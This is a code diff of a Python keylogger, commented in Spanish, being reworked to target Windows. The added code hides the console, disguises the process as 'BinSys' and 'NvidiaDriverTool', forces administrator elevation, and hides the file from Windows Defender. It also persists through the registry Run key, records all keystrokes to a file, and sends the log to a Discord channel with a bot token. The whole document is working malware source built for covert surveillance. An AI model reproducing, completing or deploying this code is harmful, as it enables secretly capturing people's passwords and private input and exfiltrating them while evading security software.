@@ -19,66 +19,89 @@ import discord
 import asyncio
 import threading
 import time
+import winreg
 
-# Startea el programa en segundo plano
-def run_in_background():
-    thread = threading.Thread(target=run_as_root)
-    thread.start()
+# Startea el programa escondido como proceso de windows
+def start():
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    ctypes.windll.kernel32.SetConsoleTitleW("BinSys")
+    setproctitle.setproctitle("BinSys")
+    os.system("python3 keylogger.py")
 
-# Ejecuta el script como administrador
+# Fuerza a ejecutar el proceso como administrador
 
-def run_as_root(program):
+def force_admin():
+    try:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+        return True
+    except:
+        return False
+        pass
+# Chequea si el script se ejecuta como administrador
+
+def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
-
-# Si el programa se ejecuta como usuario, cierra
-if run_as_root() == False:
-    print("ejecuta el programa como administrador para su funcionamiento")
-    sys.exit()
-
-# Pregunta al usuario si quiere ejecutar el archivo como administrador
-ask = input("Es necesario ejecutar el script como administrador (y/n)")
-if ask == "y":
-    run_as_root()
-
-if ask == "n": 
-    sys.exit()
-else:
+    
+if is_admin() == False:
+    force_admin()
+    if force_admin() == False:
+        sys.exit()
+# Esconde el proceso del script al Windows Defender
+def hide_process():
+    try:
+        ctypes.windll.kernel32.SetFileAttributesW("keylogger.py", 2)
+        return True
+    except:
+        return False
+if hide_process() == True:
+    pass
+if hide_process() == False:
+    print("Windows defender ha detectado el script, cerrando proceso...")
     sys.exit()
 
 # Forzar la creación del archivo de texto
 create_txt = "keylog.txt"
 open(create_txt, 'w').close()
 
-# Mover el archivo a la carpeta de boot en Kali (autoejecución)
-source_file = "keylogger.py"  # Cambia esto al archivo fuente correcto si es diferente
-destination_directory = "/boot/"
-
-if os.path.exists(source_file) and os.path.exists(destination_directory):
-    destination_file = os.path.join(destination_directory, os.path.basename(source_file))
-
+# Añade el script al inicio de Windows
+def add_to_reg():
     try:
-        os.rename(source_file, destination_file)
-    except Exception as e:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(key, "keylogger.py", 0, winreg.REG_SZ, "keylogger.py")
+        key.Close()
+        return True
+    except:
+        return False
+if add_to_reg() == True:
+    print("Script anclado al inicio de Windows")
+    # Cambia el nombre del archivo en el registro a "NvidiaDriverTool"
+    ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID("NvidiaDriverTool")
+if add_to_reg() == False:
+    print("No se ha podido cambiar el nombre del registro, se recomienda cerrar el script")
+
+    # Caja de confirmacion para cerrar el proceso en este punto
+
+    ask = input("¿Desea cerrar el script?")
+    if ask == "y":
+        sys.exit()
+    if ask == "n":
         pass
-else:
-    pass
-
-# Cambiar el nombre del proceso del script
-setproctitle.setproctitle("binsys")
-
 # Define el archivo de salida de las teclas
+
 output_file = "keylog.txt"
 
 # Función de escritura de las teclas al archivo
+
 def write_to_file(key):
     with open(output_file, "a") as f:
         if hasattr(key, 'char') and key.char is not None:
             f.write(key.char + "\n")
 
 # Función de salida al presionar una tecla
+
 def on_press(key):
     if key == Key.f12:
         print("Tecla F12 detectada, terminando el proceso...")
@@ -86,11 +109,13 @@ def on_press(key):
     write_to_file(key)
 
 # Iniciar la escucha del teclado
+
 with Listener(on_press=on_press) as listener:
     print("Escuchando el teclado...")
     listener.join()   
 
 # Envio de mensaje a canal de discord especificado
+
 def send_to_discord(channel_id, bot_token):
     channel_id = str("")
     bot_token = str("")
@@ -101,6 +126,7 @@ def send_to_discord(channel_id, bot_token):
     async def on_ready():
         print(f"Bot en linea. Nombre:{client.user}")
         # Lee y muestra el archivo de texto 
+
         with open("keylog.txt", "r") as file:
             content = file.read()
             # Especifica el canal en el que se enviará el mensaje
